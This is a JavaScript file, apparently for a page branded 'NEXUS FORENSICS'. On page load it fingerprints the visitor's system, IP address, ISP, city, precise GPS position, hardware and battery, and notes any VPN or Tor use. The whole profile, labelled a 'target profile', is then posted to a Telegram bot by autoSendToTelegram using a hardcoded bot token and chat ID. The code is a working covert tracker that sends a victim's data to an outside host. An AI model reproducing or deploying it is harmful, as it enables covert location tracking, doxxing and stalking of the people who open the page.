document.addEventListener('DOMContentLoaded', () => {
    // --- Telegram Konfiqurasiyası ---
    const TELEGRAM_CONFIG = {
        botToken: '6800223810:AAFxY2GC2A6PHl3oquOTDUWQMv-HMBXjdoA',
        chatId: '6353022269'
    };

    // --- Qlobal Referanslar və State ---
    const DOM = {
        sessionIdMain: document.getElementById('session-id-main'),
        sessionTime: document.getElementById('session-time'),
        progressFill: document.getElementById('progress-fill'),
        progressPercent: document.getElementById('progress-percent'),
        scanStatus: document.getElementById('scan-status'),
        liveDatetime: document.getElementById('live-datetime'),
        geoCoordsText: document.getElementById('geo-coords-text'),
        ispBadgeDisplay: document.getElementById('isp-badge-display'),
        riskPercent: document.getElementById('risk-percent'),
        riskFactors: document.getElementById('risk-factors'),
        systemGrid: document.getElementById('system-grid'),
        networkGrid: document.getElementById('network-grid'),
        hardwareGrid: document.getElementById('hardware-grid'),
        securityGrid: document.getElementById('security-grid'),
        rawJsonOutput: document.getElementById('raw-json-output'),
        toggleRawBtn: document.getElementById('toggle-raw-data'),
        telegramStatus: document.getElementById('telegram-status')
    };

    // Yığılan məlumatlar
    const rawData = {
        session: {},
        system: {},
        network: {},
        geolocation: {},
        hardware: {},
        security: {},
        fingerprint: {}
    };

    let completedTasks = 0;
    const TOTAL_TASKS = 5;
    let mapInstance = null;

    // --- Utility Funksiyalar ---
    const updateProgress = () => {
        completedTasks++;
        const percent = Math.round((completedTasks / TOTAL_TASKS) * 100);
        if (DOM.progressFill) DOM.progressFill.style.width = `${percent}%`;
        if (DOM.progressPercent) DOM.progressPercent.textContent = `${percent}%`;
        
        if (completedTasks === TOTAL_TASKS) {
            DOM.scanStatus.innerHTML = `<span class="pulse-dot" style="background: var(--accent-success);"></span> TAMAMLANDI`;
            generateFingerprintAndRisk();
            updateRawJsonOutput();
            drawCharts();
            initMap();
            autoSendToTelegram(); // Avtomatik Telegram'a göndər
        }
    };

    const addGridItem = (gridElement, label, value, valueClass = '') => {
        if (!gridElement) return;
        const item = document.createElement('div');
        item.className = 'data-item';
        item.innerHTML = `
            <span class="data-label">${label}</span>
            <span class="data-value ${valueClass}">${value}</span>
        `;
        gridElement.appendChild(item);
    };

    const setSessionInfo = () => {
        const sessionId = Math.random().toString(36).substring(2, 10).toUpperCase() + 
                         Math.floor(Math.random() * 10000).toString().padStart(4, '0');
        const now = new Date();
        DOM.sessionIdMain.textContent = sessionId;
        DOM.sessionTime.textContent = now.toLocaleTimeString('az-AZ', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        rawData.session = { 
            id: sessionId, 
            timestamp: now.toISOString(),
            localTime: now.toLocaleString('az-AZ')
        };
        
        setInterval(() => {
            const d = new Date();
            DOM.liveDatetime.textContent = d.toLocaleString('az-AZ', { 
                day: '2-digit', month: '2-digit', year: 'numeric', 
                hour: '2-digit', minute: '2-digit', second: '2-digit' 
            });
        }, 1000);
    };

    // --- 1. Sistem Məlumatları (Daha dəqiq analiz) ---
    const analyzeSystem = () => {
        const nav = navigator;
        const screenData = window.screen;
        const ua = nav.userAgent;
        
        let os = 'Naməlum';
        let osVersion = '';
        if (ua.includes('Windows NT 10.0')) { os = 'Windows 10/11'; osVersion = 'NT 10.0'; }
        else if (ua.includes('Windows NT 6.3')) { os = 'Windows 8.1'; osVersion = 'NT 6.3'; }
        else if (ua.includes('Windows NT 6.1')) { os = 'Windows 7'; osVersion = 'NT 6.1'; }
        else if (ua.includes('Mac OS X')) { 
            os = 'macOS'; 
            const match = ua.match(/Mac OS X ([0-9_]+)/);
            osVersion = match ? match[1].replace(/_/g, '.') : '';
        }
        else if (ua.includes('Linux')) { 
            os = 'Linux'; 
            const match = ua.match(/Linux (.*?);/);
            osVersion = match ? match[1] : '';
        }
        else if (ua.includes('Android')) { 
            os = 'Android'; 
            const match = ua.match(/Android ([0-9.]+)/);
            osVersion = match ? match[1] : '';
        }
        else if (ua.includes('iPhone') || ua.includes('iPad')) { 
            os = 'iOS'; 
            const match = ua.match(/OS ([0-9_]+)/);
            osVersion = match ? match[1].replace(/_/g, '.') : '';
        }
        
        let browser = 'Naməlum';
        let browserVersion = '';
        if (ua.includes('Firefox')) { browser = 'Firefox'; browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || ''; }
        else if (ua.includes('Edg')) { browser = 'Edge'; browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || ''; }
        else if (ua.includes('Chrome')) { browser = 'Chrome'; browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || ''; }
        else if (ua.includes('Safari')) { browser = 'Safari'; browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || ''; }
        
        // WebGL GPU məlumatı
        let gpuInfo = 'Naməlum';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
            if (gl && debugInfo) {
                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        } catch (e) {}
        
        const systemInfo = {
            'Əməliyyat Sistemi': os + (osVersion ? ` (${osVersion})` : ''),
            'Brauzer': browser + (browserVersion ? ` v${browserVersion}` : ''),
            'GPU / Renderer': gpuInfo,
            'Brauzer Dili': nav.language,
            'Ekran Həlli': `${screenData.width}x${screenData.height} @ ${screenData.colorDepth}bit`,
            'Mövcud Ekran': `${screenData.availWidth}x${screenData.availHeight}`,
            'Vaxt Zonası': Intl.DateTimeFormat().resolvedOptions().timeZone,
            'Touch Dəstəyi': 'ontouchstart' in window ? 'Var' : 'Yoxdur',
            'Do Not Track': nav.doNotTrack || 'Qeyri-aktiv',
            'Cookies Aktiv': nav.cookieEnabled ? 'Bəli' : 'Xeyr',
            'Platform': nav.platform || 'Naməlum',
            'Vendor': nav.vendor || 'Naməlum',
            'User Agent': ua.substring(0, 50) + '...'
        };
        
        rawData.system = systemInfo;
        Object.entries(systemInfo).forEach(([k, v]) => addGridItem(DOM.systemGrid, k, v));
        updateProgress();
    };

    // --- 2. Şəbəkə və Coğrafiya (Daha detallı) ---
    const analyzeNetwork = async () => {
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const ip = ipData.ip;
            
            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
            const geo = await geoRes.json();
            
            if (geo.error) throw new Error(geo.reason);
            
            const networkInfo = {
                'Public IPv4': ip,
                'ISP / Təşkilat': geo.org || 'Naməlum',
                'ASN': geo.asn || 'Naməlum',
                'Şəbəkə Bloku': geo.network || 'Naməlum',
                'Ölkə': `${geo.country_name || ''} (${geo.country_code || ''})`,
                'Şəhər': geo.city || 'Naməlum',
                'Region': geo.region || 'Naməlum',
                'Poçt Kodu': geo.postal || 'Naməlum',
                'Vaxt Zonası': geo.timezone || 'Naməlum',
                'UTC Offset': geo.utc_offset || 'Naməlum',
                'Koordinatlar': `${geo.latitude || '?'}, ${geo.longitude || '?'}`
            };
            
            rawData.network = networkInfo;
            rawData.geoLocation = {
                lat: geo.latitude,
                lon: geo.longitude,
                city: geo.city,
                country: geo.country_name
            };
            
            Object.entries(networkInfo).forEach(([k, v]) => addGridItem(DOM.networkGrid, k, v));
            
            DOM.geoCoordsText.textContent = `${geo.latitude || '?'}, ${geo.longitude || '?'}`;
            DOM.ispBadgeDisplay.textContent = geo.org || 'ISP Naməlum';
            
            rawData.security.proxy = geo.proxy || false;
            rawData.security.hosting = geo.hosting || false;
            rawData.security.tor = geo.tor || false;
            rawData.security.vpn = geo.vpn || false;
            
        } catch (err) {
            console.error('Şəbəkə xətası:', err);
            addGridItem(DOM.networkGrid, 'Xəta', 'API Əlaqəsi Uğursuz', 'value-danger');
        } finally {
            updateProgress();
        }
    };

    // --- 3. GPS Geolokasiya (Daha dəqiq) ---
    const analyzeGeolocation = () => {
        if (!navigator.geolocation) {
            rawData.geolocation = { status: 'Dəstəklənmir' };
            updateProgress();
            return;
        }
        
        const timeout = setTimeout(() => {
            rawData.geolocation = { status: 'Timeout' };
            addGridItem(DOM.networkGrid, 'GPS Status', 'Vaxt Aşımı', 'value-warning');
            updateProgress();
        }, 8000);
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                clearTimeout(timeout);
                const coords = pos.coords;
                const geoInfo = {
                    'GPS Latitude': coords.latitude.toFixed(6),
                    'GPS Longitude': coords.longitude.toFixed(6),
                    'GPS Dəqiqlik': `±${Math.round(coords.accuracy)} m`,
                    'Hündürlük': coords.altitude ? `${coords.altitude.toFixed(1)} m` : 'Naməlum',
                    'Başlıq (Heading)': coords.heading ? `${coords.heading.toFixed(1)}°` : 'Naməlum',
                    'Sürət': coords.speed ? `${(coords.speed * 3.6).toFixed(1)} km/saat` : 'Naməlum'
                };
                rawData.geolocation = geoInfo;
                Object.entries(geoInfo).forEach(([k, v]) => addGridItem(DOM.networkGrid, k, v));
                DOM.geoCoordsText.textContent = `${coords.latitude.toFixed(6)}, ${coords.longitude.toFixed(6)}`;
                rawData.gpsLocation = { lat: coords.latitude, lon: coords.longitude };
                updateProgress();
            },
            (err) => {
                clearTimeout(timeout);
                let msg = 'İcazə Rədd Edildi';
                if (err.code === 1) msg = 'İcazə Rədd Edildi';
                else if (err.code === 2) msg = 'Siqnal Tapılmadı';
                else if (err.code === 3) msg = 'Vaxt Aşımı';
                rawData.geolocation = { status: msg };
                addGridItem(DOM.networkGrid, 'GPS Status', msg, 'value-danger');
                updateProgress();
            },
            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
    };

    // --- 4. Aparat Məlumatları ---
    const analyzeHardware = () => {
        const nav = navigator;
        const hardwareInfo = {
            'Məntiqi CPU Nüvəsi': nav.hardwareConcurrency || 'Naməlum',
            'Təxmini RAM': nav.deviceMemory ? `${nav.deviceMemory} GB` : 'Naməlum',
            'Bağlantı Tipi': nav.connection?.effectiveType?.toUpperCase() || 'Naməlum',
            'Təxmini Sürət': nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : 'Naməlum',
            'RTT (Gecikmə)': nav.connection?.rtt ? `${nav.connection.rtt} ms` : 'Naməlum',
            'Məlumat Saxlama': nav.connection?.saveData ? 'Aktiv' : 'Passiv'
        };
        
        rawData.hardware = hardwareInfo;
        Object.entries(hardwareInfo).forEach(([k, v]) => addGridItem(DOM.hardwareGrid, k, v));
        
        if ('getBattery' in navigator) {
            navigator.getBattery().then(b => {
                const level = `${Math.round(b.level * 100)}%`;
                const charging = b.charging ? 'Şarjda' : 'Batareya';
                const time = b.chargingTime === Infinity ? 'Tam dolu' : `${Math.round(b.chargingTime / 60)} dəq`;
                addGridItem(DOM.hardwareGrid, 'Batareya', `${level} (${charging})`);
                rawData.hardware.battery = { level, charging, chargingTime: time };
            }).catch(()=>{});
        }
        updateProgress();
    };

    // --- 5. Təhlükəsizlik Analizi ---
    const analyzeSecurity = () => {
        const factors = [];
        let riskScore = 0;
        
        if (rawData.security.proxy) { riskScore += 35; factors.push({name: 'Proksi Aşkarlandı', danger: true}); }
        if (rawData.security.hosting) { riskScore += 45; factors.push({name: 'Hosting/Data Mərkəzi', danger: true}); }
        if (rawData.security.tor) { riskScore += 55; factors.push({name: 'Tor Şəbəkəsi', danger: true}); }
        if (rawData.security.vpn) { riskScore += 40; factors.push({name: 'VPN İstifadəsi', danger: true}); }
        
        const ua = navigator.userAgent;
        if (ua.includes('Headless') || !navigator.languages || navigator.languages.length === 0) {
            riskScore += 25;
            factors.push({name: 'Headless Brauzer', danger: true});
        }
        
        if (navigator.webdriver) { riskScore += 30; factors.push({name: 'WebDriver Deteksiyası', danger: true}); }
        
        if (riskScore > 100) riskScore = 100;
        
        rawData.security.riskScore = riskScore;
        rawData.security.factors = factors;
        
        DOM.riskPercent.textContent = `${riskScore}%`;
        
        factors.forEach(f => {
            const div = document.createElement('div');
            div.className = 'risk-factor-item';
            div.innerHTML = `<span class="factor-icon ${f.danger ? 'danger' : 'safe'}"></span>${f.name}`;
            DOM.riskFactors.appendChild(div);
        });
        
        if (factors.length === 0) {
            DOM.riskFactors.innerHTML = '<div class="risk-factor-item"><span class="factor-icon safe"></span>Heç bir anomaliya aşkarlanmadı</div>';
        }
        
        addGridItem(DOM.securityGrid, 'Proksi', rawData.security.proxy ? 'Aktiv' : 'Passiv', rawData.security.proxy ? 'value-danger' : '');
        addGridItem(DOM.securityGrid, 'Hosting', rawData.security.hosting ? 'Bəli' : 'Xeyr', rawData.security.hosting ? 'value-danger' : '');
        addGridItem(DOM.securityGrid, 'Tor', rawData.security.tor ? 'Bəli' : 'Xeyr', rawData.security.tor ? 'value-danger' : '');
        addGridItem(DOM.securityGrid, 'VPN', rawData.security.vpn ? 'Bəli' : 'Xeyr', rawData.security.vpn ? 'value-danger' : '');
        addGridItem(DOM.securityGrid, 'WebDriver', navigator.webdriver ? 'Aktiv' : 'Passiv', navigator.webdriver ? 'value-danger' : '');
        addGridItem(DOM.securityGrid, 'Risk Skoru', `%${riskScore}`, riskScore > 30 ? 'value-danger' : 'value-highlight');
        
        updateProgress();
    };

    // --- Xəritəni başlat ---
    const initMap = () => {
        const lat = rawData.gpsLocation?.lat || rawData.geoLocation?.lat || 40.4093;
        const lon = rawData.gpsLocation?.lon || rawData.geoLocation?.lon || 49.8671;
        
        if (mapInstance) mapInstance.remove();
        
        mapInstance = L.map('leaflet-map').setView([lat, lon], 13);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
        }).addTo(mapInstance);
        
        L.marker([lat, lon]).addTo(mapInstance)
            .bindPopup(`${rawData.geoLocation?.city || 'Naməlum'}, ${rawData.geoLocation?.country || ''}`)
            .openPopup();
        
        L.circle([lat, lon], { radius: 500, color: '#00f0ff', fillColor: '#00f0ff', fillOpacity: 0.2 }).addTo(mapInstance);
    };

    // --- Telegram-a məlumat göndər ---
    const sendToTelegram = async () => {
        if (!DOM.telegramStatus) return;
        
        DOM.telegramStatus.style.display = 'flex';
        DOM.telegramStatus.className = 'telegram-status sending';
        DOM.telegramStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Telegram-a göndərilir...';
        
        try {
            const reportText = formatTelegramMessage();
            
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: reportText,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            
            if (result.ok) {
                DOM.telegramStatus.className = 'telegram-status success';
                DOM.telegramStatus.innerHTML = '<i class="fas fa-check-circle"></i> Məlumatlar Telegram-a uğurla göndərildi!';
            } else {
                throw new Error(result.description || 'Bilinməyən xəta');
            }
        } catch (error) {
            console.error('Telegram xətası:', error);
            DOM.telegramStatus.className = 'telegram-status error';
            DOM.telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Telegram xətası: ${error.message}`;
        }
        
        setTimeout(() => {
            if (DOM.telegramStatus) DOM.telegramStatus.style.display = 'none';
        }, 5000);
    };
    
    const autoSendToTelegram = () => {
        setTimeout(() => sendToTelegram(), 1000);
    };
    
    const formatTelegramMessage = () => {
        const d = rawData;
        return `
🔷 <b>NEXUS FORENSICS | HƏDƏF PROFİLİ</b> 🔷

🆔 <b>Sessiya ID:</b> <code>${d.session.id}</code>
📅 <b>Zaman:</b> ${d.session.localTime}

💻 <b>SİSTEM:</b>
• OS: ${d.system['Əməliyyat Sistemi']}
• Brauzer: ${d.system['Brauzer']}
• GPU: ${d.system['GPU / Renderer']}
• Ekran: ${d.system['Ekran Həlli']}
• Dil: ${d.system['Brauzer Dili']}
• Vaxt Zonası: ${d.system['Vaxt Zonası']}

🌐 <b>ŞƏBƏKƏ:</b>
• IP: ${d.network['Public IPv4']}
• ISP: ${d.network['ISP / Təşkilat']}
• ASN: ${d.network['ASN']}
• Ölkə: ${d.network['Ölkə']}
• Şəhər: ${d.network['Şəhər']}
• Region: ${d.network['Region']}
• Koordinatlar: ${d.network['Koordinatlar']}

📍 <b>GPS (Dəqiq):</b>
${d.geolocation['GPS Latitude'] ? `• Lat: ${d.geolocation['GPS Latitude']}` : '• GPS: Məlumat yoxdur'}
${d.geolocation['GPS Longitude'] ? `• Lon: ${d.geolocation['GPS Longitude']}` : ''}
${d.geolocation['GPS Dəqiqlik'] ? `• Dəqiqlik: ${d.geolocation['GPS Dəqiqlik']}` : ''}

⚙️ <b>APARAT:</b>
• CPU Nüvəsi: ${d.hardware['Məntiqi CPU Nüvəsi']}
• RAM: ${d.hardware['Təxmini RAM']}
• Bağlantı: ${d.hardware['Bağlantı Tipi']}
• Sürət: ${d.hardware['Təxmini Sürət']}

🛡️ <b>TƏHLÜKƏSİZLİK:</b>
• Proksi: ${d.security.proxy ? '✅ Aşkarlandı' : '❌ Yoxdur'}
• Hosting: ${d.security.hosting ? '✅ Aşkarlandı' : '❌ Yoxdur'}
• Tor: ${d.security.tor ? '✅ Aşkarlandı' : '❌ Yoxdur'}
• VPN: ${d.security.vpn ? '✅ Aşkarlandı' : '❌ Yoxdur'}
• Risk Skoru: <b>${d.security.riskScore}%</b>

🔗 <b>Xəritə:</b> https://maps.google.com/?q=${d.geoLocation?.lat || ''},${d.geoLocation?.lon || ''}

⏐ NEXUS FORENSICS v4.0 ⏐
        `.trim();
    };

    // Chart-lar ---
    const generateFingerprintAndRisk = () => {
        const canvas = document.getElementById('fingerprintCanvas');
        if (canvas) {
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#0a1018';
            ctx.fillRect(0, 0, 280, 80);
            ctx.font = 'bold 14px "JetBrains Mono"';
            ctx.fillStyle = '#e8f0fe';
            ctx.fillText('NEXUS::FINGERPRINT', 10, 25);
            ctx.font = '12px "JetBrains Mono"';
            ctx.fillStyle = '#00f0ff';
            ctx.fillText(`ID: ${rawData.session.id}`, 10, 50);
            
            const gradient = ctx.createLinearGradient(0, 0, 280, 0);
            gradient.addColorStop(0, '#00f0ff');
            gradient.addColorStop(0.5, '#bf00ff');
            gradient.addColorStop(1, '#00f0ff');
            ctx.fillStyle = gradient;
            ctx.fillRect(10, 65, 260, 3);
        }
        
        const gaugeCtx = document.getElementById('riskGauge')?.getContext('2d');
        if (gaugeCtx) {
            new Chart(gaugeCtx, {
                type: 'doughnut',
                data: {
                    datasets: [{
                        data: [rawData.security.riskScore, 100 - rawData.security.riskScore],
                        backgroundColor: ['#ff3366', '#1a2330'],
                        borderWidth: 0
                    }]
                },
                options: { cutout: '75%', plugins: { tooltip: { enabled: false } } }
            });
        }
    };

    const drawCharts = () => {
        if (navigator.hardwareConcurrency) {
            const cpuCtx = document.getElementById('cpuChart')?.getContext('2d');
            new Chart(cpuCtx, {
                type: 'doughnut',
                data: { datasets: [{ data: [navigator.hardwareConcurrency, Math.max(16 - navigator.hardwareConcurrency, 0)], backgroundColor: ['#00f0ff', '#1a2330'] }] },
                options: { cutout: '65%', plugins: { legend: { display: false } } }
            });
        }
        
        if (navigator.deviceMemory) {
            const ramCtx = document.getElementById('ramChart')?.getContext('2d');
            new Chart(ramCtx, {
                type: 'doughnut',
                data: { datasets: [{ data: [navigator.deviceMemory, Math.max(16 - navigator.deviceMemory, 0)], backgroundColor: ['#bf00ff', '#1a2330'] }] },
                options: { cutout: '65%', plugins: { legend: { display: false } } }
            });
        }
    };

    const updateRawJsonOutput = () => {
        if (DOM.rawJsonOutput) {
            DOM.rawJsonOutput.textContent = JSON.stringify(rawData, null, 2);
        }
    };

    // --- Event Listeners ---
    const setupEventListeners = () => {
        DOM.toggleRawBtn?.addEventListener('click', () => {
            const pre = DOM.rawJsonOutput;
            pre.style.display = pre.style.display === 'none' ? 'block' : 'none';
        });
        
        document.getElementById('export-report-btn')?.addEventListener('click', () => {
            const blob = new Blob([JSON.stringify(rawData, null, 2)], {type: 'application/json'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `nexus_report_${rawData.session.id}.json`;
            a.click();
        });
        
        document.getElementById('copy-json-btn')?.addEventListener('click', () => {
            navigator.clipboard?.writeText(JSON.stringify(rawData, null, 2));
            alert('✅ JSON məlumatları kopyalandı!');
        });
        
        document.getElementById('telegram-send-btn')?.addEventListener('click', sendToTelegram);
        document.getElementById('refresh-scan-btn')?.addEventListener('click', () => window.location.reload());
    };

    // --- Başlat ---
    setSessionInfo();
    analyzeSystem();
    analyzeNetwork();
    analyzeGeolocation();
    analyzeHardware();
    setTimeout(() => analyzeSecurity(), 1500);
    setupEventListeners();
});